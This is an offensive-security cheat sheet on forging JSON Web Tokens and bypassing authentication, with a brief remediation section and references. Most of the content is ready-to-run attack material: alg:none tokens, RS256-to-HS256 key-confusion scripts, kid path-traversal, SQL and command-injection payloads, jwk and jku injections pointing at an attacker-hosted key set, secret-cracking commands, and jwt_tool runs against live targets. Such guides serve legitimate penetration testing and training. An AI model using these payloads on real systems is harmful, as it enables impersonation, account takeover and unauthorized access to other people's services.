# JWT & Authentication Attacks

JSON Web Tokens carry identity/authorization claims and are validated by signature. Implementation mistakes — accepting unsigned tokens, confusing signature algorithms, trusting attacker-supplied keys — let an attacker forge tokens and impersonate any user (full auth bypass / account takeover). In 2025 alone, six critical JWT-library CVEs were disclosed; the core attack classes (`alg:none`, RS256→HS256 confusion, `kid`/`jwk`/`jku` injection) still work in 2026.

---

## JWT structure

```
header.payload.signature       (each part = base64url)
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.<sig>
{"alg":"HS256","typ":"JWT"}   {"user":"admin","role":"user","exp":...}
```

Decode quickly:

```bash
jwt_tool eyJ...                      # full analysis
# or manual
echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d 2>/dev/null
```

---

## Attacks

### 1. `alg: none` (unsigned acceptance)

Strip the signature and tell the server there is none:

```text
Header:  {"alg":"none","typ":"JWT"}
Payload: {"user":"admin","role":"admin"}
Token:   base64url(header).base64url(payload).        <- trailing dot, empty sig
```

```bash
jwt_tool <TOKEN> -X a                 # auto-forge alg:none (none/None/NONE/nOnE)
```

Variants to try: `none`, `None`, `NONE`, `nOnE` (case bypass of naive blocklists).

### 2. Algorithm confusion: RS256 → HS256 (key confusion)

If the server uses one code path for symmetric & asymmetric algos, you can sign an `HS256` token using the server's **public RSA key as the HMAC secret** (the public key is, well, public).

```bash
# 1. Obtain the public key (JWKS, /jwks.json, /.well-known/openid-configuration,
#    or recover it from two RS256 tokens)
curl https://TARGET/.well-known/jwks.json
# Recover pubkey from 2 tokens if no endpoint:
python3 jwt_forgery.py token1 token2          # (rsa_sign2n)
# Convert JWK -> PEM as needed

# 2. Forge: change alg to HS256, set role=admin, HMAC-sign with pubkey
jwt_tool <TOKEN> -X k -pk public.pem          # key confusion mode
# or with python jwt:
python3 - <<'PY'
import jwt
pub = open("public.pem").read()
print(jwt.encode({"user":"admin","role":"admin"}, key=pub, algorithm="HS256"))
PY
```

Critical detail: the HMAC secret must be the **exact byte representation** of the public key the server uses (PEM with the right newlines/trailing). Try with and without the trailing newline.

### 3. `kid` (Key ID) injection

`kid` tells the server which key to use. If it's used unsafely:

```text
# Path traversal -> point at a predictable file whose contents you know
{"alg":"HS256","kid":"../../../../dev/null"}   -> empty key -> sign with ""
{"alg":"HS256","kid":"/dev/null"}

# SQL injection in kid (key fetched from DB)
{"kid":"x' UNION SELECT 'attackersecret'-- -"}  -> control the key bytes

# Command injection / LFI in kid
{"kid":"|id"}   {"kid":"/proc/self/environ"}
```

`/dev/null` returns empty → sign the token with an empty key; very common bypass.

### 4. `jwk` header injection (self-signed key)

Embed your own public key in the token header; vulnerable libs trust it:

```bash
jwt_tool <TOKEN> -X i                 # inject self-generated jwk, sign with its private key
```

```json
{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","n":"<attacker_n>","e":"AQAB"}}
```

### 5. `jku` / `x5u` (key-set URL) injection / SSRF

Point the token at *your* JWKS so the server fetches your public key:

```json
{"alg":"RS256","jku":"https://ATTACKER/jwks.json"}
```

Host a JWKS with your key; sign with the matching private key. Bypass URL allowlists with the SSRF tricks (userinfo `@`, open redirect on an allowlisted host, fragment tricks):

```text
{"jku":"https://trusted.com@attacker.com/jwks.json"}
{"jku":"https://trusted.com/redirect?url=https://attacker.com/jwks.json"}
```

### 6. Weak HMAC secret — crack it

```bash
# hashcat mode 16500
hashcat -a 0 -m 16500 jwt.txt rockyou.txt
# john
john jwt.txt --format=HMAC-SHA256 --wordlist=rockyou.txt
# jwt_tool dictionary
jwt_tool <TOKEN> -C -d jwt.secrets.list
```

Then forge anything with the recovered secret.

### 7. Claim tampering / logic flaws

```text
- exp not checked            -> replay an expired token forever
- "user":"admin" by value    -> change username/role/id and re-sign (if you have key)
- "aud"/"iss" not validated   -> reuse a token from another service/tenant
- kid points to your token's own embedded key (jwk) above
- "sub"/"uid" IDOR via JWT    -> swap user id claim
- nbf/iat manipulation, negative exp
```

### 8. Other auth bypasses (non-JWT)

```text
- Session fixation / predictable session ids
- Missing/weak 2FA: brute the OTP, race the verify endpoint, response-status oracle
- Password reset: host-header poisoning to steal reset link, token leakage in Referer,
  reusable/non-expiring tokens, account enum via timing/response diffs
- OAuth: redirect_uri manipulation, state CSRF, leaking code via Referer, account linking
- Remember-me cookies = persistent secrets, often deterministic
```

---

## Methodology

```bash
# 1. Decode & inspect every JWT in the app
jwt_tool <TOKEN>
# 2. Run all forgery modes (none, key confusion, jwk, jku, kid, etc.)
jwt_tool <TOKEN> -M at -t https://TARGET/api/me -rc "Authorization: Bearer "
#    -M = all attacks, -t target, -rc cookie/header to replace
# 3. Crack weak secret
hashcat -m 16500 jwt.txt rockyou.txt
# 4. Tamper claims, check exp/aud/iss enforcement
```

---

## Tooling

| Tool | Use |
|------|-----|
| **jwt_tool** | All-in-one: decode, tamper, all attack modes, secret crack, target scan |
| **hashcat -m 16500 / john** | Brute weak HMAC secrets |
| **jwt.io** | Quick decode (don't paste real prod tokens) |
| **Burp JWT Editor** (PortSwigger ext) | GUI tamper, embedded-jwk attack, key confusion |
| **rsa_sign2n / jwt_forgery.py** | Recover RSA public key from two RS256 tokens |

---

## Remediation

- **Pin the algorithm** server-side; never trust the token's `alg`. Reject `none`.
- Use separate verify keys per algorithm; don't share a code path for HMAC vs RSA.
- Validate `exp`, `nbf`, `iat`, `aud`, `iss` on every request.
- Treat `kid`/`jku`/`x5u`/`jwk` as untrusted: allowlist `jku`/`x5u` URLs, ignore embedded `jwk`, sanitize `kid` (no path/SQL).
- Use long, random HMAC secrets (≥256-bit); rotate keys.
- Keep JWT libraries patched (multiple 2025 CVEs).

---

## Cheatsheet

```text
# alg:none (note trailing dot, empty sig)
{"alg":"none"}.{"role":"admin"}.
jwt_tool TOKEN -X a
# RS256 -> HS256 confusion (sign with public key as HMAC secret)
jwt_tool TOKEN -X k -pk public.pem
# kid empty key
{"alg":"HS256","kid":"/dev/null"}   -> sign with ""
# kid SQLi
{"kid":"x' UNION SELECT 'secret'-- -"}
# jwk inject
jwt_tool TOKEN -X i
# jku to attacker JWKS
{"jku":"https://trusted.com@attacker/jwks.json"}
# crack secret
hashcat -m 16500 jwt.txt rockyou.txt
# run everything against a live endpoint
jwt_tool TOKEN -M at -t https://T/api/me -rh "Authorization: Bearer "
```

---

## References

- PortSwigger — JWT attacks: https://portswigger.net/web-security/jwt
- PortSwigger — Algorithm confusion: https://portswigger.net/web-security/jwt/algorithm-confusion
- PayloadsAllTheThings — JWT: https://swisskyrepo.github.io/PayloadsAllTheThings/JSON%20Web%20Token/
- HackTricks — JWT: https://hacktricks.wiki/en/pentesting-web/hacking-jwt-json-web-token.html
- jwt_tool: https://github.com/ticarpi/jwt_tool
- Intigriti — Exploiting JWT vulnerabilities: https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-jwt-vulnerabilities
- JWT algorithm confusion (2025): https://aquilax.ai/blog/jwt-algorithm-confusion-auth-bypass
- JWT vulnerabilities 2026: https://redsentry.com/resources/blog/jwt-vulnerabilities-list-2026-security-risks-mitigation-guide
